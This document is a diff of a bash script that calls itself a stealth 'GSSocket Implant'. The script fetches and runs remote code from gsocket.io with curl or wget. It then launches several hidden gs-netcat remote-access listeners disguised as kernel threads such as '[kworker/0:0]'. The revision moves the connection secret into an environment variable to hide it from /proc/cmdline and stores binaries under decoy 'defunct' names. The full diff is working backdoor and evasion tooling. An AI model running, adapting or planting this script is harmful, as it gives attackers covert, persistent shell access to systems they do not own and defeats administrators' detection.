@@ -1,22 +1,23 @@
 #!/bin/bash
-# PRIMAL GSSocket Implant - Superior stealth
+# PRIMAL GSSocket - SUPERIOR STEALTH
+# Key difference: Uses GS_ARGS env var, NOT command line args
+# This hides -s SECRET from /proc/cmdline
 
 SECRET="${1:-}"
+MODE="${2:-stealth}"
 
-# Disguised process names (kernel thread style)
-NAMES=("[kworker/0:0-events]" "[kworker/1:1-mm]" "[migration/0]" "[ksoftirqd/0]" "[watchdogd]" "[rcu_sched]" "[kswapd0]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
+# Kernel thread names - blend in perfectly
+KNAMES=("[kworker/0:0]" "[kworker/u8:0]" "[migration/0]" "[ksoftirqd/0]" "[watchdog/0]" "[kswapd0]" "[khugepaged]" "[kdevtmpfs]" "[kauditd]" "[khungtaskd]")
 
 # Find gs-netcat binary
-find_gsbin() {
-    # Check common locations
+find_bin() {
     for loc in \
         "$(command -v gs-netcat 2>/dev/null)" \
-        "/usr/bin/gs-netcat" \
         "$HOME/.config/htop/defunct" \
         "/var/www/monitor-server/defunct" \
+        "/usr/bin/gs-netcat" \
         "/tmp/.gsusr-$(id -u)/defunct" \
-        "/dev/shm/defunct" \
-        "$(pwd)/defunct"
+        "/dev/shm/defunct"
     do
         [ -x "$loc" ] 2>/dev/null && echo "$loc" && return 0
     done
@@ -25,81 +26,74 @@ find_gsbin() {
 
 # Find existing secret
 find_secret() {
-    for secfile in \
+    for f in \
         "$HOME/.config/htop/defunct.dat" \
         "/var/www/monitor-server/defunct.dat" \
-        "/tmp/.gsusr-$(id -u)/defunct.dat" \
-        "/dev/shm/defunct.dat"
+        "/tmp/.gsusr-$(id -u)/defunct.dat"
     do
-        [ -f "$secfile" ] 2>/dev/null && cat "$secfile" 2>/dev/null && return 0
+        [ -f "$f" ] && cat "$f" 2>/dev/null && return 0
     done
     return 1
 }
 
-# Main
-GS_BIN=$(find_gsbin)
+GS_BIN=$(find_bin)
 
+# Install if not found
 if [ -z "$GS_BIN" ]; then
-    # Install via official method
     if command -v curl >/dev/null 2>&1; then
-        if [ -n "$SECRET" ]; then
-            X="$SECRET" bash -c "$(curl -fsSL gsocket.io/y)" >/dev/null 2>&1
-        else
-            bash -c "$(curl -fsSL gsocket.io/y)" >/dev/null 2>&1
-        fi
+        [ -n "$SECRET" ] && export X="$SECRET"
+        bash -c "$(curl -fsSL gsocket.io/y)" >/dev/null 2>&1
     elif command -v wget >/dev/null 2>&1; then
-        if [ -n "$SECRET" ]; then
-            X="$SECRET" bash -c "$(wget -qO- gsocket.io/y)" >/dev/null 2>&1
-        else
-            bash -c "$(wget -qO- gsocket.io/y)" >/dev/null 2>&1
-        fi
+        [ -n "$SECRET" ] && export X="$SECRET"
+        bash -c "$(wget -qO- gsocket.io/y)" >/dev/null 2>&1
     else
         echo '{"status":"error","message":"need curl or wget"}'
         exit 1
     fi
-    
-    # Find again after install
     sleep 2
-    GS_BIN=$(find_gsbin)
+    GS_BIN=$(find_bin)
 fi
 
-if [ -z "$GS_BIN" ]; then
-    echo '{"status":"error","message":"gs-netcat not found"}'
-    exit 1
-fi
+[ -z "$GS_BIN" ] && { echo '{"status":"error","message":"binary not found"}'; exit 1; }
 
 # Get secret
-if [ -z "$SECRET" ]; then
-    SECRET=$(find_secret)
-fi
-if [ -z "$SECRET" ]; then
-    SECRET=$("$GS_BIN" -g 2>/dev/null)
-fi
-if [ -z "$SECRET" ]; then
-    SECRET=$(head -c 16 /dev/urandom 2>/dev/null | xxd -p | head -c 24)
-fi
+[ -z "$SECRET" ] && SECRET=$(find_secret)
+[ -z "$SECRET" ] && SECRET=$("$GS_BIN" -g 2>/dev/null)
+[ -z "$SECRET" ] && SECRET=$(head -c 16 /dev/urandom 2>/dev/null | xxd -p | head -c 22)
 
-# Start stealth instance
-# NOTE: Use /bin/sh WITHOUT --norc (dash doesn't support it)
-# The bypass for .bashrc is handled by using sh instead of bash
-name="${NAMES[$((RANDOM % ${#NAMES[@]}))]}"
+# CRITICAL: Start with MAXIMUM stealth
+# Use GS_ARGS environment variable - this HIDES arguments from /proc/cmdline!
+start_stealth() {
+    local name="${KNAMES[$((RANDOM % ${#KNAMES[@]}))]}"
+    
+    (
+        cd /tmp 2>/dev/null || cd /
+        # KEY: Use GS_ARGS env var instead of command line!
+        # This makes cmdline show ONLY the process name, not the secret
+        export GS_ARGS="-s $SECRET -liqD"
+        export TERM=xterm-256color
+        export SHELL=/bin/sh
+        
+        # exec -a changes argv[0] (process name in ps)
+        # The actual arguments are read from GS_ARGS env var
+        exec -a "$name" "$GS_BIN" </dev/null >/dev/null 2>&1
+    ) &
+    disown 2>/dev/null
+}
 
-(
-    cd /tmp 2>/dev/null || cd /
-    export TERM=xterm-256color
-    # Use exec -a to disguise process name
-    # Use /bin/sh -i (not --norc, that's bash-only)
-    exec -a "$name" "$GS_BIN" -s "$SECRET" -l -e "/bin/sh -i" </dev/null >/dev/null 2>&1
-) &
-disown 2>/dev/null
+# Start instances
+for i in 1 2 3; do
+    start_stealth
+    sleep 0.3
+done
 
 sleep 2
 
-# Count running instances
+# Count
 running=$(pgrep -f "defunct\|gs-netcat" 2>/dev/null | wc -l)
 pids=$(pgrep -f "defunct\|gs-netcat" 2>/dev/null | tr '\n' ',' | sed 's/,$//')
 
-# Output single valid JSON
+# Output
 cat << EOJSON
-{"status":"success","secret":"$SECRET","binary":"$GS_BIN","instances":$running,"pids":"$pids","connect":"gs-netcat -s $SECRET -i","features":["official-gsocket","process-disguise","multi-instance"]}
+{"status":"success","secret":"$SECRET","binary":"$GS_BIN","instances":$running,"pids":"$pids","connect":"gs-netcat -s $SECRET -i","features":["env-stealth","no-cmdline-args","kernel-thread-disguise"]}
 EOJSON
